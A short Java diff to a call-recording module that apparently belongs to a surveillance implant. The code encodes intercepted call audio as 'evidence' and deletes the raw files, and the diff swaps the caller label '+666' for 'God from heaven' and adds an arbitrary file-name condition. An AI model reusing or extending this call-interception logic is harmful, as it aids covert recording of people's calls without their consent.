@@ -953,17 +953,17 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			}
 
 			// Encode to evidence
-			saveCallEvidence("+666", true, begin, end, encodedFile, false, remote);
+			saveCallEvidence("God from heaven", true, begin, end, encodedFile, false, remote);
 
 			// We have an end of call and it's on both channels
-			if (audioEncoder.isLastCallFinished()) {
+			if (audioEncoder.isLastCallFinished() && encodedFile.endsWith("-r.tmp.err")) {
 				// After encoding create the end of call marker
-				closeCallEvidence("+666", true, begin, end);
+				closeCallEvidence("God from heaven", true, begin, end);
 
 				if (Cfg.DEBUG) {
 					Check.log(TAG + "(encodeChunks): end of call reached");
 				}
-			}	
+			}
 		}
 
 		// Remove file
@@ -971,6 +971,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 			Check.log(TAG + "(encodeChunks): deleting " +  f);
 		}
 
+		// Defensive, saveCallEvidence()/closeCallEvidence() already removes the file
 		audioEncoder.removeRawFile();
 	}
 }
